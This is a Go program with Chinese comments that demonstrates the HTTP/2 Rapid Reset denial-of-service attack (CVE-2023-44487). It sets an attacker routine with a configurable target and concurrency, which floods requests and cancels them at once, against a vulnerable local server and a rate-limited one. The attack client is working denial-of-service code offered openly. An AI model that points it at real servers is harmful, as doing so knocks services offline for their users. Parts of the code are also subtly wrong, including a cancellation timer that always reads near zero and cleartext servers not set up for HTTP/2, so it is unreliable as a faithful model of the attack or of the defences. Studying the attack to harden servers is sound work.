package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

// CVE-2023-44487: HTTP/2 Rapid Reset Attack 演示
// 警告：此代码仅用于教育目的，不要用于攻击真实系统

// VulnerableHTTP2Server 模拟易受攻击的HTTP/2服务器
type VulnerableHTTP2Server struct {
	activeStreams int64
	mu            sync.Mutex
	streamInfo    map[uint32]*StreamInfo
}

// StreamInfo 流信息
type StreamInfo struct {
	ID        uint32
	StartTime time.Time
	Cancelled bool
}

// ServeHTTP 处理HTTP请求
func (s *VulnerableHTTP2Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	streamID := atomic.AddInt64(&s.activeStreams, 1)
	
	// 记录流信息
	s.mu.Lock()
	if s.streamInfo == nil {
		s.streamInfo = make(map[uint32]*StreamInfo)
	}
	s.streamInfo[uint32(streamID)] = &StreamInfo{
		ID:        uint32(streamID),
		StartTime: time.Now(),
	}
	s.mu.Unlock()
	
	// 模拟处理延迟
	select {
	case <-time.After(100 * time.Millisecond):
		// 正常处理
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Stream %d processed\n", streamID)
		
	case <-r.Context().Done():
		// 请求被取消
		s.mu.Lock()
		if info, exists := s.streamInfo[uint32(streamID)]; exists {
			info.Cancelled = true
		}
		s.mu.Unlock()
		
		log.Printf("Stream %d cancelled after %v", streamID, time.Since(time.Now()))
	}
	
	// 清理流信息
	s.mu.Lock()
	delete(s.streamInfo, uint32(streamID))
	s.mu.Unlock()
	
	atomic.AddInt64(&s.activeStreams, -1)
}

// GetStats 获取服务器统计信息
func (s *VulnerableHTTP2Server) GetStats() (active int64, cancelled int) {
	active = atomic.LoadInt64(&s.activeStreams)
	
	s.mu.Lock()
	defer s.mu.Unlock()
	
	for _, info := range s.streamInfo {
		if info.Cancelled {
			cancelled++
		}
	}
	
	return active, cancelled
}

// RapidResetAttacker 实施Rapid Reset攻击
type RapidResetAttacker struct {
	target        string
	concurrent    int
	requestsSent  int64
	requestsFailed int64
}

// Attack 执行攻击
func (a *RapidResetAttacker) Attack() {
	fmt.Printf("开始Rapid Reset攻击: %s\n", a.target)
	fmt.Printf("并发数: %d\n", a.concurrent)
	
	// 创建HTTP/2客户端
	client := &http.Client{
		Transport: &http2.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // 仅用于演示
			},
			AllowHTTP: true,
		},
		Timeout: 30 * time.Second,
	}
	
	var wg sync.WaitGroup
	
	// 启动并发攻击协程
	for i := 0; i < a.concurrent; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			a.attackLoop(client, id)
		}(i)
	}
	
	// 监控状态
	go a.monitor()
	
	wg.Wait()
}

// attackLoop 单个攻击循环
func (a *RapidResetAttacker) attackLoop(client *http.Client, id int) {
	for i := 0; i < 1000; i++ {
		// 创建请求
		req, err := http.NewRequest("GET", a.target, nil)
		if err != nil {
			atomic.AddInt64(&a.requestsFailed, 1)
			continue
		}
		
		// 创建可取消的上下文
		ctx, cancel := context.WithCancel(context.Background())
		req = req.WithContext(ctx)
		
		// 发送请求
		atomic.AddInt64(&a.requestsSent, 1)
		
		// 异步发送请求
		go func() {
			resp, err := client.Do(req)
			if err != nil {
				atomic.AddInt64(&a.requestsFailed, 1)
				return
			}
			resp.Body.Close()
		}()
		
		// 立即或短暂延迟后取消请求
		// 这是Rapid Reset攻击的核心
		time.Sleep(time.Duration(i%10) * time.Microsecond)
		cancel()
		
		// 避免过快发送
		if i%100 == 0 {
			time.Sleep(10 * time.Millisecond)
		}
	}
}

// monitor 监控攻击状态
func (a *RapidResetAttacker) monitor() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		sent := atomic.LoadInt64(&a.requestsSent)
		failed := atomic.LoadInt64(&a.requestsFailed)
		
		fmt.Printf("请求发送: %d, 失败: %d, 成功率: %.2f%%\n",
			sent, failed, float64(sent-failed)/float64(sent)*100)
	}
}

// ProtectedHTTP2Server 实施了保护措施的服务器
type ProtectedHTTP2Server struct {
	activeStreams int64
	maxStreams    int64
	
	// 速率限制
	rateLimiter *RateLimiter
	
	// 异常检测
	cancelRates map[string]*CancelRate
	mu          sync.RWMutex
}

// CancelRate 取消率统计
type CancelRate struct {
	total     int
	cancelled int
	lastReset time.Time
}

// ServeHTTP 带保护的处理函数
func (s *ProtectedHTTP2Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// 检查活跃流数量
	current := atomic.LoadInt64(&s.activeStreams)
	if current >= s.maxStreams {
		http.Error(w, "Too many concurrent streams", http.StatusServiceUnavailable)
		return
	}
	
	// 速率限制检查
	clientIP := r.RemoteAddr
	if !s.rateLimiter.Allow(clientIP) {
		http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
		return
	}
	
	// 记录流
	atomic.AddInt64(&s.activeStreams, 1)
	defer atomic.AddInt64(&s.activeStreams, -1)
	
	// 更新统计
	s.updateStats(clientIP, false)
	
	// 处理请求
	done := make(chan struct{})
	go func() {
		// 模拟处理
		time.Sleep(100 * time.Millisecond)
		close(done)
	}()
	
	select {
	case <-done:
		// 正常完成
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Request processed\n")
		
	case <-r.Context().Done():
		// 请求被取消
		s.updateStats(clientIP, true)
		
		// 检查取消率
		if s.checkCancelRate(clientIP) {
			// 可能是攻击，记录并采取行动
			log.Printf("Suspicious cancel rate from %s", clientIP)
			// 这里可以实施IP封禁等措施
		}
	}
}

// updateStats 更新统计信息
func (s *ProtectedHTTP2Server) updateStats(clientIP string, cancelled bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	
	if s.cancelRates == nil {
		s.cancelRates = make(map[string]*CancelRate)
	}
	
	rate, exists := s.cancelRates[clientIP]
	if !exists || time.Since(rate.lastReset) > time.Minute {
		// 重置统计
		s.cancelRates[clientIP] = &CancelRate{
			lastReset: time.Now(),
		}
		rate = s.cancelRates[clientIP]
	}
	
	rate.total++
	if cancelled {
		rate.cancelled++
	}
}

// checkCancelRate 检查取消率是否异常
func (s *ProtectedHTTP2Server) checkCancelRate(clientIP string) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	
	rate, exists := s.cancelRates[clientIP]
	if !exists {
		return false
	}
	
	// 如果取消率超过80%，认为可能是攻击
	if rate.total > 10 && float64(rate.cancelled)/float64(rate.total) > 0.8 {
		return true
	}
	
	return false
}

// RateLimiter 简单的速率限制器
type RateLimiter struct {
	mu       sync.Mutex
	requests map[string][]time.Time
	limit    int
	window   time.Duration
}

// Allow 检查是否允许请求
func (r *RateLimiter) Allow(clientID string) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	
	now := time.Now()
	
	// 清理过期记录
	if requests, exists := r.requests[clientID]; exists {
		validRequests := []time.Time{}
		for _, t := range requests {
			if now.Sub(t) < r.window {
				validRequests = append(validRequests, t)
			}
		}
		r.requests[clientID] = validRequests
	} else {
		r.requests[clientID] = []time.Time{}
	}
	
	// 检查限制
	if len(r.requests[clientID]) >= r.limit {
		return false
	}
	
	// 记录新请求
	r.requests[clientID] = append(r.requests[clientID], now)
	return true
}

func main() {
	fmt.Println("=== CVE-2023-44487: HTTP/2 Rapid Reset Attack 演示 ===\n")
	
	// 启动易受攻击的服务器
	vulnServer := &VulnerableHTTP2Server{}
	go func() {
		fmt.Println("启动易受攻击的HTTP/2服务器: http://localhost:8090")
		
		server := &http.Server{
			Addr:    ":8090",
			Handler: vulnServer,
		}
		
		// 启用HTTP/2
		http2.ConfigureServer(server, &http2.Server{})
		
		log.Fatal(server.ListenAndServe())
	}()
	
	// 启动受保护的服务器
	protectedServer := &ProtectedHTTP2Server{
		maxStreams: 100,
		rateLimiter: &RateLimiter{
			requests: make(map[string][]time.Time),
			limit:    50,
			window:   time.Second,
		},
	}
	
	go func() {
		fmt.Println("启动受保护的HTTP/2服务器: http://localhost:8091")
		
		server := &http.Server{
			Addr:    ":8091",
			Handler: protectedServer,
		}
		
		// 配置HTTP/2，限制并发流
		http2.ConfigureServer(server, &http2.Server{
			MaxConcurrentStreams: 100,
		})
		
		log.Fatal(server.ListenAndServe())
	}()
	
	// 等待服务器启动
	time.Sleep(2 * time.Second)
	
	fmt.Println("\n=== 攻击演示 ===")
	fmt.Println("1. 攻击易受攻击的服务器")
	
	attacker := &RapidResetAttacker{
		target:     "http://localhost:8090",
		concurrent: 50,
	}
	
	// 运行攻击10秒
	go attacker.Attack()
	time.Sleep(10 * time.Second)
	
	// 显示统计
	active, cancelled := vulnServer.GetStats()
	fmt.Printf("\n易受攻击服务器状态: 活跃流=%d, 已取消=%d\n", active, cancelled)
	
	fmt.Println("\n2. 攻击受保护的服务器")
	
	attacker2 := &RapidResetAttacker{
		target:     "http://localhost:8091",
		concurrent: 50,
	}
	
	go attacker2.Attack()
	time.Sleep(10 * time.Second)
	
	fmt.Println("\n=== 防御措施说明 ===")
	fmt.Println("1. 限制并发流数量")
	fmt.Println("2. 实施速率限制")
	fmt.Println("3. 监控异常的取消率")
	fmt.Println("4. 快速释放被取消的流资源")
	fmt.Println("5. 实施客户端IP黑名单")
	
	// 保持程序运行
	select {}
}